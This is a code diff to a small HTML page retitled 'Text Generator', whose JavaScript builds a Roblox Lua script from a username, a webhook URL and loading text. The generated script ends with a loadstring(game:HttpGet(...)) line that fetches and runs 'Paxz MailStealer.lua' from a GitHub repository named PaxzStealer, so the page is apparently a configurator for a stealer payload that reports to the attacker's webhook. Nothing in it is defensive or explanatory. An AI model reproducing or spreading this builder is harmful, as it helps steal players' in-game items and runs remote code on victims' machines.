@@ -2,34 +2,59 @@
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>GitHub Pages Script Generator</title>
+    <title>Text Generator</title>
+    <style>
+      body {
+        background-image: url('https://wallpapercave.com/wp/wp4575209.jpg');
+        background-size: cover;
+        font-family: Arial, sans-serif;
+      }
+      #container {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      input {
+        margin: 10px;
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+        background-color: rgba(255, 255, 255, 0.5);
+      }
+      button {
+        margin: 10px;
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+        background-color: #4285f4;
+        color: #fff;
+        cursor: pointer;
+      }
+      button:hover {
+        background-color: #0d47a1;
+      }
+    </style>
   </head>
   <body>
-    <h1>GitHub Pages Script Generator</h1>
-    <form>
-      <label for="username">Username:</label><br>
-      <input type="text" id="username" name="username"><br>
-      <label for="webhook">Webhook:</label><br>
-      <input type="text" id="webhook" name="webhook"><br>
-      <label for="loadingText">LoadingText:</label><br>
-      <input type="text" id="loadingText" name="loadingText"><br>
-      <label for="output">Script Output:</label><br>
-      <textarea id="output" rows="10" cols="50"></textarea><br>
-      <input type="button" value="Generate Script" onclick="generateScript();">
-    </form>
-
+    <div id="container">
+      <input id="username" type="text" placeholder="Username">
+      <input id="webhook" type="text" placeholder="Webhook">
+      <input id="loadingText" type="text" placeholder="Loading Text">
+      <input id="script" type="text" readonly>
+      <button onclick="generateScript()">Generate Script</button>
+    </div>
     <script>
       function generateScript() {
         var username = document.getElementById("username").value;
         var webhook = document.getElementById("webhook").value;
         var loadingText = document.getElementById("loadingText").value;
-
-        var script = '_G.UserName = "' + username + '"\n';
-        script += '_G.Webhook = "' + webhook + '"\n';
-        script += '_G.loadingScreenText = "' + loadingText + '"\n\n';
-        script += 'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
-
-        document.getElementById("output").value = script;
+        var script = "_G.UserName = \"" + username + "\";\n" +
+                     "_G.Webhook = \"" + webhook + "\";\n" +
+                     "_G.loadingScreenText = \"" + loadingText + "\";\n\n" +
+                     'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
+        document.getElementById("script").value = script;
       }
     </script>
   </body>
